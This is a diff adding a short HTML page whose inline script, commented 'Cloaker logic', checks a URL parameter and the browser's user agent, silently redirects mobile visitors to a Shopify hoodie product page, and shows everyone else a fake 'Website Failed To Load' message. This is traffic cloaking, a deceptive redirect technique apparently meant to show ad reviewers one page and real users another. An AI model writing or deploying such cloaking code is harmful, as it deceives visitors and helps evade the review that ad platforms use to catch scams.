@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+    console.log("test1")
+                    } else if (isMobileDevice) {
+                        window.location.href = "https://essyhoodie.myshopify.com/products/essential-hoodie";
+                    } else {
+                    }
+            </script>
+            <title>Website Failed To Load</title>
+        <style type="text/css" id="operaUserStyle"></style></head>
+        <body>
+            <h1>Website Failed To Load...</h1>
+            <p>Please wait whilst the website it loading...</p>
+
+
+            </body></html>
